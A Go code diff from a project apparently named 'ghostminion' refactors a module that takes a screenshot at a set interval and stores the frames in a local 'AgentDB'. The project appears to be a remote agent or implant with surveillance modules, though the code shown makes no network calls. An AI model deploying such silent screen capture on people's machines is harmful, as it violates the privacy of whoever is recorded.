@@ -2,64 +2,94 @@ package apps
 
 import (
 	"bytes"
+	"context"
 	"errors"
 	"ghostminion/db"
 	"ghostminion/db/dbDataTypes"
 	"github.com/kbinani/screenshot"
-	"image"
 	"image/jpeg"
-	"sync"
 	"time"
 )
 
+type ScreenShotParams struct {
+	Interval int `json:"interval"`
+	Quality  int `json:"quality"`
+}
+
 type ScreenshotApp struct {
-	Interval       int `json:"interval"`
-	Quality        int `json:"quality"`
-	stop           chan struct{}
+	baseApp        *BaseApp
+	params         *ScreenShotParams
 	screenshotChan chan bytes.Buffer
 }
 
-func NewScreenshotApp(interval int, quality int) (*ScreenshotApp, error) {
-	app := &ScreenshotApp{
-		Interval:       interval,
-		Quality:        quality,
-		stop:           make(chan struct{}),
-		screenshotChan: make(chan bytes.Buffer),
+func NewScreenshotApp(appData AppData) (*ScreenshotApp, error) {
+	params := &ScreenShotParams{}
+	if err := appData.UnmarshalParams(params); err != nil {
+		return nil, err
 	}
-
+	app := &ScreenshotApp{
+		baseApp: &BaseApp{
+			stop:    make(chan struct{}, 1),
+			AppData: &appData,
+		},
+		params:         params,
+		screenshotChan: make(chan bytes.Buffer, 10),
+	}
 	if err := app.validateParams(); err != nil {
 		return nil, err
 	}
-
 	return app, nil
 }
 
-func (c *ScreenshotApp) Start(wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	go c.startProducer()
-	go c.startConsumer()
+func (app *ScreenshotApp) Name() string {
+	return app.baseApp.Name
 }
 
-func (c *ScreenshotApp) startProducer() {
-	ticker := time.NewTicker(time.Duration(c.Interval) * time.Second)
+// Start is blocking.
+// It runs produce + store loops until ctx is canceled.
+// It returns when both loops have exited.
+func (app *ScreenshotApp) Start(ctx context.Context) error {
+	// launch store
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		app.store(ctx)
+	}()
+
+	// run produce in this goroutine (blocking)
+	app.produce(ctx)
+
+	// wait for `store` to finish before returning
+	<-done
+	return nil
+}
+
+// Stop is optional cleanup.
+// Context cancel will stop produce/store loops.
+// Here we just close the screenshotChan.
+func (app *ScreenshotApp) Stop() error {
+	close(app.screenshotChan)
+	return nil
+}
+
+func (app *ScreenshotApp) produce(ctx context.Context) {
+	ticker := time.NewTicker(time.Duration(app.params.Interval) * time.Second)
 	defer ticker.Stop()
 
 	for {
 		select {
-		case <-c.stop:
+		case <-ctx.Done():
 			return
 		case <-ticker.C:
-			screenshotBuf, err := c.getScreenshot()
+			screenshotBuf, err := app.getScreenshot()
 			if err != nil {
-				lgr.Warn("error capturing screenshot:", err.Error())
+				lgr.Warn("error capturing screenshot: " + err.Error())
 				continue
 			}
-			captureTime := time.Now().Unix()
-			lgr.Info("Screenshot captured at", captureTime)
+			lgr.Info("Screenshot captured at ", time.Now().Unix())
 
 			select {
-			case c.screenshotChan <- screenshotBuf:
+			case app.screenshotChan <- screenshotBuf:
 			default:
 				lgr.Warn("screenshot channel full, dropping frame")
 			}
@@ -67,46 +97,49 @@ func (c *ScreenshotApp) startProducer() {
 	}
 }
 
-func (c *ScreenshotApp) startConsumer() {
-	for ss := range c.screenshotChan {
-		err := db.GetInstance().WriteData("", dbDataTypes.Screenshots, ss.Bytes())
-		if err != nil {
-			lgr.Error("Error writing screenshot to AgentDB:", err)
+func (app *ScreenshotApp) store(ctx context.Context) {
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case buf, ok := <-app.screenshotChan:
+			if !ok {
+				return
+			}
+			if err := db.GetInstance().WriteData("", dbDataTypes.Screenshots, buf.Bytes()); err != nil {
+				lgr.Error("Error writing screenshot to AgentDB: " + err.Error())
+			}
 		}
 	}
 }
 
-func (c *ScreenshotApp) Stop() {
-	close(c.stop)
-	close(c.screenshotChan)
-}
-
-func (c *ScreenshotApp) validateParams() error {
-	if c.Interval <= 0 {
+func (app *ScreenshotApp) validateParams() error {
+	if app.params.Interval <= 0 {
 		return errors.New("interval must be > 0")
 	}
-	if c.Quality < 1 || c.Quality > 100 {
+	if app.params.Quality < 1 || app.params.Quality > 100 {
 		return errors.New("quality must be between 1 and 100")
 	}
 	return nil
 }
 
-func (c *ScreenshotApp) getScreenshot() (bytes.Buffer, error) {
+func (app *ScreenshotApp) getScreenshot() (bytes.Buffer, error) {
 	var buf bytes.Buffer
-	var err error
 
 	activeDisplaysNum := screenshot.NumActiveDisplays()
 	if activeDisplaysNum <= 0 {
 		return buf, errors.New("no active displays found")
 	}
 
-	for i := 0; i <= activeDisplaysNum; i++ {
-		bounds := screenshot.GetDisplayBounds(i).Union(image.Rect(0, 0, 0, 0))
-		if img, err := screenshot.CaptureRect(bounds); img != nil {
-			if err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: c.Quality}); err == nil {
-				return buf, nil
-			}
+	for i := 0; i < activeDisplaysNum; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			continue
+		}
+		if err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: app.params.Quality}); err == nil {
+			return buf, nil
 		}
 	}
-	return bytes.Buffer{}, err
+	return bytes.Buffer{}, errors.New("failed to capture screenshot")
 }
